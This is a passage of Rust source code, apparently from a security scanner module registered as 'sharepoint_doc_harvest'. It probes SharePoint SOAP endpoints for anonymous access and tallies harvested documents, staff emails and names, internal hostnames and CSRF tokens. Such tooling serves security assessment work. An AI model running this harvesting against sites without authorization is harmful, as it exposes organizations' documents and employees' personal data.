    ctx.rate_limit(&normalized).await;
    let soap_body = SOAP_GET_SITE_URL.replace("{url}", &base_url);
    match client
        .post(&sitedata_url)
        .header("Content-Type", "text/xml; charset=utf-8")
        .header(
            "SOAPAction",
            "http://schemas.microsoft.com/sharepoint/soap/GetSiteUrl",
        )
        .body(soap_body)
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => {
            if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                if body.contains("<GetSiteUrlResult>") || body.contains("<siteUrl>") {
                    crate::mprintln!(
                        "{}",
                        "[+] SOAP GetSiteUrl accessible".green()
                    );
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Note,
                        message: "SOAP GetSiteUrl accessible anonymously - URL structure leaked"
                            .to_string(),
                        data: Some(serde_json::json!({
                            "endpoint": format!("{}/_vti_bin/sitedata.asmx", base_url),
                            "operation": "GetSiteUrl"
                        })),
                    });
                }
            }
        }
        _ => {
            crate::mprintln!("{}", "[*] SOAP GetSiteUrl: not accessible".dimmed());
        }
    }

    // webs.asmx WebUrlFromPageUrl
    ctx.rate_limit(&normalized).await;
    let webs_url = format!("{}/_vti_bin/webs.asmx", base_url);
    let soap_body = SOAP_WEB_URL_FROM_PAGE.replace("{url}", &format!("{}/default.aspx", base_url));
    match client
        .post(&webs_url)
        .header("Content-Type", "text/xml; charset=utf-8")
        .header(
            "SOAPAction",
            "http://schemas.microsoft.com/sharepoint/soap/WebUrlFromPageUrl",
        )
        .body(soap_body)
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => {
            if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                if body.contains("<WebUrlFromPageUrlResult>") {
                    crate::mprintln!(
                        "{}",
                        "[+] SOAP WebUrlFromPageUrl accessible".green()
                    );
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Note,
                        message:
                            "SOAP WebUrlFromPageUrl accessible - URL resolution available anonymously"
                                .to_string(),
                        data: Some(serde_json::json!({
                            "endpoint": webs_url,
                            "operation": "WebUrlFromPageUrl"
                        })),
                    });
                }
            }
        }
        _ => {
            crate::mprintln!(
                "{}",
                "[*] SOAP WebUrlFromPageUrl: not accessible".dimmed()
            );
        }
    }

    // Authentication.asmx Mode
    ctx.rate_limit(&normalized).await;
    let auth_url = format!("{}/_vti_bin/Authentication.asmx", base_url);
    match client
        .post(&auth_url)
        .header("Content-Type", "text/xml; charset=utf-8")
        .header(
            "SOAPAction",
            "http://schemas.microsoft.com/sharepoint/soap/Mode",
        )
        .body(SOAP_AUTH_MODE)
        .send()
        .await
    {
        Ok(resp) => {
            let status = resp.status();
            if status.is_success() {
                if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                    crate::mprintln!(
                        "{}",
                        "[+] Authentication.asmx Mode accessible".green()
                    );
                    // Extract auth mode
                    let mode = if body.contains("Windows") {
                        "Windows"
                    } else if body.contains("Forms") {
                        "Forms"
                    } else if body.contains("None") {
                        "None"
                    } else {
                        "Unknown"
                    };
                    crate::mprintln!(
                        "{}",
                        format!("    Auth mode: {}", mode).green()
                    );
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Note,
                        message: format!(
                            "Authentication mode disclosed: {} (via Authentication.asmx)",
                            mode
                        ),
                        data: Some(serde_json::json!({
                            "endpoint": auth_url,
                            "mode": mode
                        })),
                    });
                }
            } else {
                crate::mprintln!(
                    "{}",
                    format!("[*] Authentication.asmx Mode: {}", status).dimmed()
                );
            }
        }
        Err(e) => {
            crate::mprintln!(
                "{}",
                format!("[-] Authentication.asmx error: {}", e).dimmed()
            );
        }
    }

    crate::mprintln!();

    // ================================================================
    // SUMMARY
    // ================================================================
    crate::mprintln!("{}", "=== Summary ===".bold());
    crate::mprintln!(
        "{}",
        format!(
            "  SharePoint version: {}",
            if sp_version.is_empty() {
                "Unknown"
            } else {
                &sp_version
            }
        )
        .cyan()
    );
    crate::mprintln!(
        "{}",
        format!(
            "  Accessible libraries: {}",
            accessible_libraries.len()
        )
        .cyan()
    );
    crate::mprintln!(
        "{}",
        format!("  Documents found: {}", total_docs).cyan()
    );
    crate::mprintln!(
        "{}",
        format!(
            "  Total data: {:.1} MB ({} bytes)",
            total_bytes as f64 / 1_048_576.0,
            total_bytes
        )
        .cyan()
    );
    crate::mprintln!(
        "{}",
        format!("  Emails extracted: {}", all_emails.len()).cyan()
    );
    crate::mprintln!(
        "{}",
        format!("  Staff names: {}", all_names.len()).cyan()
    );
    crate::mprintln!(
        "{}",
        format!("  Internal hostnames: {}", all_hostnames.len()).cyan()
    );
    crate::mprintln!(
        "{}",
        format!("  CSRF tokens: {}", all_digests.len()).cyan()
    );
    crate::mprintln!();

    // Primary finding: document harvesting
    if total_docs > 0 {
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Vulnerable,
            message: format!(
                "Anonymous document harvesting: {} documents ({:.1} MB) accessible from {} libraries",
                total_docs,
                total_bytes as f64 / 1_048_576.0,
                accessible_libraries.len()
            ),
            data: Some(serde_json::json!({
                "total_documents": total_docs,
                "total_bytes": total_bytes,
                "libraries": accessible_libraries,
                "document_urls": all_doc_urls,
            })),
        });
    }

    if accessible_libraries.is_empty() && total_docs == 0 && outcome.findings.is_empty() {
        crate::mprintln!(
            "{}",
            "  No anonymous access detected.".green()
        );
    }

    Ok(outcome)
}

crate::register_native_module!(crate::module::Category::Scanners, "sharepoint_doc_harvest", native);
